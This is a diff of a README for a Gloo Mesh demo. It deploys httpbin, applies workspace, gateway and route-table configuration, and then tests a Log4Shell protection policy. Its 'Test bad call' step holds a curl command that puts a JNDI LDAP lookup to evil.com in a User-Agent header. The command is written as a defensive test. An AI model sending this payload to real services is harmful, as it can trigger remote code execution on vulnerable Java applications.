@@ -13,22 +13,17 @@ kubectl apply -f log4shell/httpbin.yaml -n httpbin --context gloo
 
 ## Gloo Mesh Config
 
-
-https://www.solo.io/blog/handling-super-sized-requests-with-gloo-edge/
-
 ```sh
 kubectl apply -f log4shell/workspace.yaml --context gloo
 kubectl apply -f log4shell/virtual-gateway.yaml --context gloo
 kubectl apply -f log4shell/route-table.yaml --context gloo
 ```
 
-
 ## Test bad call
 
 ```sh
 curl -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" localhost:8080/anything -i
 ```
-
 
 ## Apply Policy
 
